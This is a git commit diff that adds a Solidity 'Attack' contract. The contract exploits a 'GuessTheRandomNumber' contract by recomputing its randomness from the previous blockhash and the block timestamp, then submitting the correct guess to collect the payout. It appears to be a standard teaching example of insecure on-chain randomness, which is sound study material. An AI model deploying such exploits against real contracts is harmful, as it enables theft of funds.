1afb0e92c105581b3d83e61a7dda0d36af855d6b
jinwon93 <kjw8208@nate.com>
2022-06-18 20:50:24 +0900

    20220618

--- Applications/Randomness.sol
+++ Applications/Randomness.sol
@@ -16,3 +16,22 @@ contract GuessTheRandomNumber {
         }
     }
 }
+
+
+
+contract Attack {
+    receive() external payable {}
+
+    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
+        uint answer = uint(
+            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
+        );
+
+        guessTheRandomNumber.guess(answer);
+    }
+
+    // Helper function to check balance
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}    
